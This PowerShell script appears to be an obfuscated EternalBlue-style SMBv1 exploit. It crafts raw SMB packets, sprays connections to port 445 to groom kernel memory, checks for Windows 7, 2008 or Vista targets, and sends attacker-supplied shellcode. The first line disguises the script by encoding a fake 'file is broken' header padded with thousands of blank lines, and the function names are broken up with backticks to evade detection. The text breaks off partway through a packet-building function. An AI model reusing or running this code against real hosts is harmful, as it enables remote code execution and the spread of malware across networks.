$jsb64=[convert]::ToBase64String([Text.UnicodeEncoding]::Ascii.GetBytes("//This file is broken...  "+"`r`n"*2000+" "*200)+[convert]::FromBase64String($jsb64))

function make_smb1_anonymous_login_packet {

[Byte[]] $pkt = [Byte[]] (0x00)

$pkt += 0x00,0x00,0x48

$pkt += 0xff,0x53,0x4D,0x42

$pkt += 0x73

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x18

$pkt += 0x01,0x48

$pkt += 0x00,0x00

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x00,0x00

$pkt += 0xff,0xff

$pkt += 0x2f,0x4b

$pkt += 0x00,0x00

$pkt += 0x00,0x00

$pkt += 0x0d

$pkt += 0xff

$pkt += 0x00

$pkt += 0x00,0x00

$pkt += 0x00,0xf0

$pkt += 0x02,0x00

$pkt += 0x2f,0x4b

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x00,0x00

$pkt += 0x00,0x00

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x41,0xc0,0x00,0x00

$pkt += 0x0b,0x00

$pkt += 0x00,0x00

$pkt += 0x6e,0x74,0x00

$pkt += 0x70,0x79,0x73,0x6d,0x62,0x00

return $pkt

}

function smb1_anonymous_login($sock){

$raw_proto = M`A`K`e_Smb1_`ANoNy`mOus`_LO`gin_Pa`C`kET

$sock.Send($raw_proto) | OUT-`NulL

return smb1_Get`_`Res`Po`NsE($sock)

}

function negotiate_proto_request(){

[Byte[]] $pkt = [Byte[]] (0x00)

$pkt += 0x00,0x00,0x2f

$pkt += 0xFF,0x53,0x4D,0x42

$pkt += 0x72

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x18

$pkt += 0x01,0x48

$pkt += 0x00,0x00

$pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

$pkt += 0x00,0x00

$pkt += 0xff,0xff

$pkt += 0x2F,0x4B

$pkt += 0x00,0x00

$pkt += 0x00,0x00

$pkt += 0x00

$pkt += 0x0c,0x00

$pkt += 0x02

$pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00

return $pkt

}

function smb_header($smbheader) {

$parsed_header =@{server_component=$smbheader[0..3];

smb_command=$smbheader[4];

error_class=$smbheader[5];

reserved1=$smbheader[6];

error_code=$smbheader[6..7];

flags=$smbheader[8];

flags2=$smbheader[9..10];

process_id_high=$smbheader[11..12];

signature=$smbheader[13..21];

reserved2=$smbheader[22..23];

tree_id=$smbheader[24..25];

process_id=$smbheader[26..27];

user_id=$smbheader[28..29];

multiplex_id=$smbheader[30..31];

}

return $parsed_header

}

function smb1_get_response($sock){

$tcp_response = [Array]::CreateInstance(('b'+'yte'), 1024)

try{

$sock.Receive($tcp_response)| O`U`T-NULl

}

catch {

}

$netbios = $tcp_response[0..4]

$smb_header = $tcp_response[4..36]

$parsed_header = smB_h`e`ADeR($smb_header)

return $tcp_response, $parsed_header

}

function client_negotiate($sock){

$raw_proto = n`egOtiaT`e_Pr`ot`o_R`EQUEst

$sock.Send($raw_proto) | OuT`-n`ULL

return sM`B1_`geT_`REsponSe($sock)

}

function tree_connect_andx($sock, $target, $userid){

$raw_proto = tr`eE_cO`Nn`ECT_an`d`X_R`EQUEST $target $userid

$sock.Send($raw_proto) | ou`T-nULl

return sM`B1`_get_`Respo`Nse($sock)

}

function tree_connect_andx_request($target, $userid) {

[Byte[]] $pkt = [Byte[]](0x00)

$pkt +=0x00,0x00,0x48

$pkt +=0xFF,0x53,0x4D,0x42

$pkt +=0x75

$pkt +=0x00,0x00,0x00,0x00

$pkt +=0x18

$pkt +=0x01,0x48

$pkt +=0x00,0x00

$pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

$pkt +=0x00,0x00

$pkt +=0xff,0xff

$pkt +=0x2F,0x4B

$pkt += $userid

$pkt +=0x00,0x00

$ipc = (('SW'+'0SW0') -rePLACe'SW0',[Char]92)+ $target + "\IPC$"

$pkt +=0x04

$pkt +=0xFF

$pkt +=0x00

$pkt +=0x00,0x00

$pkt +=0x00,0x00

$pkt +=0x01,0x00

$al=[system.Text.Encoding]::ASCII.GetBytes($ipc).Count+8

$pkt+=[bitconverter]::GetBytes($al)[0],0x00

$pkt +=0x00

$pkt += [system.Text.Encoding]::ASCII.GetBytes($ipc)

$pkt += 0x00

$pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00

$len = $pkt.Length - 4

$hexlen = [bitconverter]::GetBytes($len)[-2..-4]

$pkt[1] = $hexlen[0]

$pkt[2] = $hexlen[1]

$pkt[3] = $hexlen[2]

return $pkt

}

function smb1_anonymous_connect_ipc($target){

$client = NE`W-`obj`EcT System.Net.Sockets.TcpClient($target,445)

$sock = $client.Client

C`liEnt`_n`egO`TiATe($sock) | O`Ut-`NuLl

$raw, $smbheader = Sm`B`1_A`NONyMO`US_LOgIN $sock

$raw, $smbheader = TrEe_c`O`N`N`eCT_aNDX $sock $target $smbheader.user_id

return $smbheader, $sock

}

function make_smb1_nt_trans_packet($tree_id, $user_id) {

[Byte[]] $pkt = [Byte[]] (0x00)

$pkt += 0x00,0x08,0x3C

$pkt += 0xff,0x53,0x4D,0x42

$pkt += 0xa0

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x18

$pkt += 0x01,0x48

$pkt += 0x00,0x00

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x00,0x00

$pkt += $tree_id

$pkt += 0x2f,0x4b

$pkt += $user_id

$pkt += 0x00,0x00

$pkt += 0x14

$pkt += 0x01

$pkt += 0x00,0x00

$pkt += 0x1e,0x00,0x00,0x00

$pkt += 0x16,0x00,0x01,0x00

$pkt += 0x1e,0x00,0x00,0x00

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x1e,0x00,0x00,0x00

$pkt += 0x4c,0x00,0x00,0x00

$pkt += 0xd0,0x07,0x00,0x00

$pkt += 0x6c,0x00,0x00,0x00

$pkt += 0x01

$pkt += 0x00,0x00

$pkt += 0x00,0x00

$pkt += 0xf1,0x07

$pkt += 0xff

$pkt += [Byte[]] (0x00) * 0x1e

$pkt += 0xff,0xff,0x00,0x00,0x01

$pkt += [Byte[]](0x00) * 0x7CD

return $pkt

}

function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) {

$timeout = ($timeout * 0x10) + 7

[Byte[]] $pkt = [Byte[]] (0x00)

$pkt += 0x00,0x10,0x38

$pkt += 0xff,0x53,0x4D,0x42

$pkt += 0x33

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x18

$pkt += 0x01,0x48

$pkt += 0x00,0x00

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x00,0x00

$pkt += $tree_id

$pkt += 0x2f,0x4b

$pkt += $user_id

$pkt += 0x00,0x00

$pkt += 0x09

$pkt += 0x00,0x00

$pkt += 0x00,0x10

$pkt += 0x00,0x00

$pkt += 0x00,0x00

$pkt += 0x00

$pkt += 0x00

$pkt += 0x00,0x10

$pkt += 0x38,0x00,0xd0

$pkt += [bitconverter]::GetBytes($timeout)[0]

$pkt += 0x00,0x00

$pkt += 0x03,0x10

$pkt += 0xff,0xff,0xff

$pkt +=$data

$len = $pkt.Length - 4

$hexlen = [bitconverter]::GetBytes($len)[-2..-4]

$pkt[1] = $hexlen[0]

$pkt[2] = $hexlen[1]

$pkt[3] = $hexlen[2]

return $pkt

}

function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) {

$timeout = ($timeout * 0x10) + 7

[Byte[]] $pkt = [Byte[]] (0x00)

$pkt += 0x00,0x08,0x7e

$pkt += 0xff,0x53,0x4D,0x42

$pkt += 0x33

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x18

$pkt += 0x01,0x48

$pkt += 0x00,0x00

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x00,0x00

$pkt += $tree_id

$pkt += 0x2f,0x4b

$pkt += $user_id

$pkt += 0x00,0x00

$pkt += 0x09

$pkt += 0x00,0x00

$pkt += 0x46,0x08

$pkt += 0x00,0x00

$pkt += 0x00,0x00

$pkt += 0x00

$pkt += 0x00

$pkt += 0x46,0x08

$pkt += 0x38,0x00,0xd0

$pkt += [bitconverter]::GetBytes($timeout)[0]

$pkt += 0x00,0x00

$pkt += 0x49,0x08

$pkt += 0xff,0xff,0xff

$pkt +=$data

$len = $pkt.Length - 4

$hexlen = [bitconverter]::GetBytes($len)[-2..-4]

$pkt[1] = $hexlen[0]

$pkt[2] = $hexlen[1]

$pkt[3] = $hexlen[2]

return $pkt

}

function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk){

$nt_trans_pkt = m`A`kE_sMB1_`N`T_TRAn`s`_pAckEt $smbheader.tree_id $smbheader.user_id

$sock.Send($nt_trans_pkt) | O`Ut-nULl

$raw, $transheader = sMb1_G`eT_ResPo`N`sE($sock)

$i=$firstDataFragmentSize

$timeout=0

while ($i -lt $data.count)

{

$sendSize=[System.Math]::Min(4096,($data.count-$i))

if (($data.count-$i) -le 4096){

if (!$sendLastChunk)

{ break }

}

$trans2_pkt = MA`k`E_SmB1_Tr`A`Ns2_EXpl`o`It_`PAcKET $smbheader.tree_id $smbheader.user_id $data[$i..($i+$sendSize-1)] $timeout

$sock.Send($trans2_pkt) | OuT`-nUll

$timeout+=1

$i +=$sendSize

}

if ($sendLastChunk)

{Smb`1_`GeT_ReSPo`NsE($sock) }

return $i,$timeout

}

function createSessionAllocNonPaged($target, $size) {

$client = n`Ew-O`B`JECT System.Net.Sockets.TcpClient($target,445)

$sock = $client.Client

CL`i`E`Nt_N`EgotiATE($sock) | O`U`T-Null

$flags2=16385

if ($size -ge 0xffff)

{ $reqsize=$size /2}

else

{

$flags2 =49153

$reqsize= $size

}

if($flags2 -eq 49153) {

$pkt = makE`_SmB`1_`FRee_hOlE_SEs`si`on`_P`ACKeT (0x01,0xc0) (0x02,0x00) (0xf0,0xff,0x00,0x00,0x00)

}

else {

$pkt = m`AKE_smB1_f`RE`e_hO`l`E_sESsiO`N_P`A`cK`eT (0x01,0x40) (0x02,0x00) (0xf8,0x87,0x00,0x00,0x00)

}

$sock.Send($pkt) | OUt-`Nu`Ll

sMb1_`GEt_R`eSp`ONSE($sock) | oUt`-N`ULl

return $sock

}

function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) {

[Byte[]] $pkt = 0x00

$pkt += 0x00,0x00,0x51

$pkt += 0xff,0x53,0x4D,0x42

$pkt += 0x73

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x18

$pkt += $flags2

$pkt += 0x00,0x00

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x00,0x00

$pkt += 0xff,0xff

$pkt += 0x2f,0x4b

$pkt += 0x00,0x00

$pkt += 0x40,0x00

$pkt += 0x0c

$pkt += 0xff

$pkt += 0x00

$pkt += 0x00,0x00

$pkt += 0x00,0xf0

$pkt += 0x02,0x00

$pkt += $vcnum

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x00,0x00

$pkt += 0x00,0x00,0x00,0x00

$pkt += 0x00,0x00,0x00,0x80

$pkt += 0x16,0x00

$pkt += $native_os

$pkt += [Byte[]] (0x00) * 17

return $pkt

}

function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks){

for($i =0; $i -lt $grooms; $i++)

{

$client = neW-o`B`jEct System.Net.Sockets.TcpClient($target,445)

$gsock = $client.Client

$groom_socks += $gsock

$gsock.Send($payload_hdr_pkt) | O`Ut-`NuLl

}

return $groom_socks

}

function make_smb2_payload_headers_packet(){

[Byte[]] $pkt = [Byte[]](0x00,0x00,0xff,0xf7,0xFE) + [system.Text.Encoding]::ASCII.GetBytes(('S'+'MB')) + [Byte[]](0x00)*124

return $pkt

}

function eb7($target ,$shellcode) {

$NTFEA_SIZE = 0x11000

$ntfea10000=0x00,0x00,0xdd,0xff+[byte[]]0x41*0xffde

$ntfea11000 =(0x00,0x00,0x00,0x00,0x00)*600

$ntfea11000 +=0x00,0x00,0xbd,0xf3+[byte[]]0x41*0xf3be

$ntfea1f000=(0x00,0x00,0x00,0x00,0x00)*0x2494

$ntfea1f000=0x00,0x00,0xed,0x48+0x41*0x48ee

$ntfea=@{0x10000=$ntfea10000;0x11000=$ntfea11000}

$TARGET_HAL_HEAP_ADDR_x64 = 0xffffffffffd00010

$TARGET_HAL_HEAP_ADDR_x86 = 0xffdff000

[byte[]]$fakeSrvNetBufferNsa = @(0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0xf0,0xdf,0xff,0x00,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x80,0xef,0xdf,0xff,0x00,0x00,0x00,0x00,0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x10,0x01,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff)

[byte[]]$fakeSrvNetBufferX64 = @(0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x01,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x10,0x01,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xff,0xcf,0xff,0xff,0xff,0xff,0xff)

$fakeSrvNetBuffer = $fakeSrvNetBufferNsa

[byte[]]$feaList=[byte[]](0x00,0x00,0x01,0x00)

$feaList += $ntfea[$NTFEA_SIZE]

$feaList +=0x00,0x00,0x8f,0x00+ $fakeSrvNetBuffer

$feaList +=0x12,0x34,0x78,0x56

[byte[]]$fake_recv_struct=@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0xb0,0x00,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0xf0,0xdf,0xff,0xc0,0xf0,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0xef,0xf1,0xdf,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0x01,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0x01,0xd0,0xff,0xff,0xff,0xff,0xff)

$client = n`Ew-oBj`EcT System.Net.Sockets.TcpClient($target,445)

$sock = $client.Client

$sock.ReceiveTimeout =5000

clIe`NT_N`E`GoTI`Ate($sock) | out-`NulL

$raw, $smbheader = sm`B`1_`AnONYmOu`S`_loG`In $sock

$os=[system.Text.Encoding]::ascii.GetString($raw[45..($raw.count-1)]).ToLower()

if (!(($os.contains(('windows'+' '+'7'))) -or ($os.contains(('wi'+'nd'+'ows')) -and $os.contains(('200'+'8'))) -or ($os.contains(('w'+'indo'+'w'+'s vi'+'sta'))) -or ($os.contains(('wind'+'o'+'ws')) -and $os.contains(('201'+'1')))))

{return $False}

$raw, $smbheader = t`Ree_co`N`NECt_AnDx $sock $target $smbheader.user_id

$progress , $timeout= Se`N`d`_B`Ig_tRanS2 $sock $smbheader $feaList 2000 $False

$allocConn = CReA`T`EsES`SIONaL`loCnon`pagEd $target ($NTFEA_SIZE - 0x1010)

$payload_hdr_pkt = mAkE`_smb2`_paYlOad_HE`AdE`RS_`Pa`cKEt

$groom_socks =@()

for ($i=0; $i -lt 13; $i++)

{

$client = n`ew-Ob`jE`ct System.Net.Sockets.TcpClient($target,445)

$gsock = $client.Client

$groom_socks += $gsock

$gsock.Send($payload_hdr_pkt) | oUt`-n`ULL

}

$holeConn = Cr`EAteseSs`i`o`N`ALLoc`N`Onp`AGEd $target ($NTFEA_SIZE - 0x10)

$allocConn.close()

for ($i=0; $i -lt 5; $i++)

{

$client = n`Ew-oBj`ecT System.Net.Sockets.TcpClient($target,445)

$gsock = $client.Client

$groom_socks += $gsock

$gsock.Send($payload_hdr_pkt) | OUT-NU`lL

}

$holeConn.close()

$trans2_pkt = maKe`_Smb1`_Tran`S2_lasT`_PAc`KET $smbheader.tree_id $smbheader.user_id $feaList[$progress..$feaList.count] $timeout

$sock.Send($trans2_pkt) | o`UT-n`ULl

$raw, $trans2header = sMB`1`_gET_resp`O`Nse($sock)

foreach ($sk in $groom_socks)

{

$sk.Send($fake_recv_struct + $shellcode) | O`UT-N`Ull

}

foreach ($sk in $groom_socks)

{

$sk.close() | o`Ut-`NUlL

}

$sock.Close()| Ou`T-NulL

return $True

}

function createFakeSrvNetBuffer8($sc_size)

{

    $totalRecvSize = 0x80 + 0x180 + $sc_size

    $fakeSrvNetBufferX64 = [byte[]]0x00*16

    $fakeSrvNetBufferX64 += 0xf0,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff

    $fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe8,0x82,0x00,0x00,0x00,0x00,0x00,0x00

    $fakeSrvNetBufferX64 +=  [byte[]]0x00*16

    $a=[bitconverter]::GetBytes($totalRecvSize)

    $fakeSrvNetBufferX64 += [byte[]]0x00*8+$a+[byte[]]0x00*4

    $fakeSrvNetBufferX64 += 0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff

    $fakeSrvNetBufferX64 += [byte[]]0x00*48

    $fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00

    $fakeSrvNetBufferX64 += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x3f,0xd0,0xff,0xff,0xff,0xff,0xff

    return $fakeSrvNetBufferX64

}

function createFeaList8($sc_size, $ntfea){

    $feaList = 0x00,0x00,0x01,0x00

    $feaList += $ntfea

    $fakeSrvNetBuf = CreateFAKEsRv`N`et`BuFfeR8($sc_size)

    $a=[bitconverter]::GetBytes($fakeSrvNetBuf.Length-1)

    $feaList += 0x00,0x00,$a[0],$a[1] + $fakeSrvNetBuf 

    $feaList += 0x12,0x34,0x78,0x56

    return $feaList

}

function  make_smb1_login8_packet8 {

    [Byte[]] $pkt = [Byte[]] (0x00) 

    $pkt += 0x00,0x00,0x88 

    $pkt += 0xff,0x53,0x4D,0x42

    $pkt += 0x73

    $pkt += 0x00,0x00,0x00,0x00

    $pkt += 0x18 

    $pkt += 0x01,0x48 

    $pkt += 0x00,0x00

    $pkt += 0x00,0x00,0x00,0x00

    $pkt += 0x00,0x00,0x00,0x00

    $pkt += 0x00,0x00

    $pkt += 0xff,0xff

    $pkt += 0x2f,0x4b 

    $pkt += 0x00,0x00 

    $pkt += 0x00,0x00       

    $pkt += 0x0c               

    $pkt += 0xff           

    $pkt += 0x00               

    $pkt += 0x00,0x00      

    $pkt += 0x00,0xf0     

    $pkt += 0x02,0x00   

    $pkt += 0x01,0x00  

    $pkt += 0x00,0x00,0x00,0x00  

    $pkt += 0x42,0x00,0x00,0x00,0x00,0x00 

    $pkt += 0x44,0xc0,0x00,0x80 

    $pkt += 0x4d,0x00   

    $pkt += 0x60,0x40,0x06,0x06,0x2b,0x06,0x01,0x05,0x05,0x02,0xa0,0x36,0x30,0x34,0xa0,0x0e,0x30,0x0c,0x06,0x0a,0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a,0xa2,0x22,0x04,0x20,0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x01,0x00,0x00,0x00,0x05,0x02,0x88,0xa0,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

    $pkt += 0x55,0x6e,0x69,0x78,0x00       

    $pkt += 0x53,0x61,0x6d,0x62,0x61,0x00

    return $pkt

}

function  make_ntlm_auth_packet8($user_id) {

    [Byte[]] $pkt = [Byte[]] (0x00)    

    $pkt += 0x00,0x00,0x96          

    $pkt += 0xff,0x53,0x4D,0x42      

    $pkt += 0x73               

    $pkt += 0x00,0x00,0x00,0x00  

    $pkt += 0x18          

    $pkt += 0x01,0x48          

    $pkt += 0x00,0x00       

    $pkt += 0x00,0x00,0x00,0x00  

    $pkt += 0x00,0x00,0x00,0x00  

    $pkt += 0x00,0x00      

    $pkt += 0xff,0xff    

    $pkt += 0x2f,0x4b  

    $pkt += $user_id    

    $pkt += 0x00,0x00   

    $pkt += 0x0c     

    $pkt += 0xff      

    $pkt += 0x00            

    $pkt += 0x00,0x00         

    $pkt += 0x00,0xf0            

    $pkt += 0x02,0x00        

    $pkt += 0x01,0x00     

    $pkt += 0x00,0x00,0x00,0x00    

    $pkt += 0x50,0x00,0x00,0x00,0x00,0x00 

    $pkt += 0x44,0xc0,0x00,0x80     

    $pkt += 0x5b,0x00           

    $pkt += 0xa1,0x4e,0x30,0x4c,0xa2,0x4a,0x04,0x48,0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x08,0x00,0x08,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x05,0x02,0x88,0xa0,0x4e,0x00,0x55,0x00,0x4c,0x00,0x4c,0x00

    $pkt += 0x55,0x6e,0x69,0x78,0x00  

    $pkt += 0x53,0x61,0x6d,0x62,0x61,0x00

    return $pkt

}

function smb1_login8($sock){

    $raw_proto = maKe_smB`1_`L`oGIn8`_PAC`ke`T8

    $sock.Send($raw_proto) | OU`T`-NulL

    $raw, $smbheader=SMb`1_Ge`T_Re`sp`O`NsE8($sock)

    $raw_proto = mA`K`E`_nTlM_`AU`TH_pACKE`T8($smbheader.user_id)

    $sock.Send($raw_proto) | OU`T-`Null

    return Sm`B1_g`eT_Re`Sp`ON`SE8($sock)

}

function negotiate_proto_request8($use_ntlm)

{ 

      [Byte[]]  $pkt = [Byte[]] (0x00)         

      $pkt += 0x00,0x00,0x2f     

      $pkt += 0xFF,0x53,0x4D,0x42 

      $pkt += 0x72            

      $pkt += 0x00,0x00,0x00,0x00 

      $pkt += 0x18           

      if($use_ntlm){ $pkt +=  0x01,0x48 }

      else{ $pkt +=  0x01,0x40 }         

      $pkt += 0x00,0x00       

      $pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 

      $pkt += 0x00,0x00      

      $pkt += 0xff,0xff    

      $pkt += 0x2F,0x4B        

      $pkt += 0x00,0x00    

      $pkt += 0x00,0x00      

      $pkt += 0x00        

      $pkt += 0x0c,0x00       

      $pkt += 0x02           

      $pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00   

      return $pkt

}

function smb_header8($smbheader) {

$parsed_header =@{server_component=$smbheader[0..3];

                  smb_command=$smbheader[4];

                  error_class=$smbheader[5];

                  reserved1=$smbheader[6];

                  error_code=$smbheader[7..8];

                  flags=$smbheader[9];

                  flags2=$smbheader[10..11];

                  process_id_high=$smbheader[12..13];

                  signature=$smbheader[14..21];

                  reserved2=$smbheader[22..23];

                  tree_id=$smbheader[24..25];

                  process_id=$smbheader[26..27];

                  user_id=$smbheader[28..29];

                  multiplex_id=$smbheader[30..31];

                 }

return $parsed_header

}

function smb1_get_response8($sock){

    $sock.ReceiveTimeout =5000

    $tcp_response = [Array]::CreateInstance(('byt'+'e'), 1024)

    try{

    $sock.Receive($tcp_response)| OUt-NU`ll

     }

     catch {

      return -1,-1

     }

    $netbios = $tcp_response[0..4]

    $smb_header8 = $tcp_response[4..36]  

    $parsed_header = S`M`B_HeAde`R8($smb_header8)  

    return $tcp_response, $parsed_header

}

function client_negotiate8($sock , $use_ntlm){

    $raw_proto = Negot`Ia`TE_P`ROT`O_requEST8($use_ntlm)

    $sock.Send($raw_proto) | out`-`NulL

    return smb1_g`eT_r`ES`Pon`se8($sock)

}

function tree_connect_andx8($sock, $target, $userid){

    $raw_proto = tr`Ee_conneCT_aN`Dx`8_R`eQuESt $target $userid

    $sock.Send($raw_proto) | OUT-Nu`lL

   return S`Mb1_Get_`Re`s`pon`se8($sock)

}

function tree_connect_andx8_request($target, $userid) { 

     [Byte[]] $pkt = [Byte[]](0x00)            

     $pkt +=0x00,0x00,0x48       

     $pkt +=0xFF,0x53,0x4D,0x42  

     $pkt +=0x75            

     $pkt +=0x00,0x00,0x00,0x00  

     $pkt +=0x18             

     $pkt +=0x01,0x48         

     $pkt +=0x00,0x00          

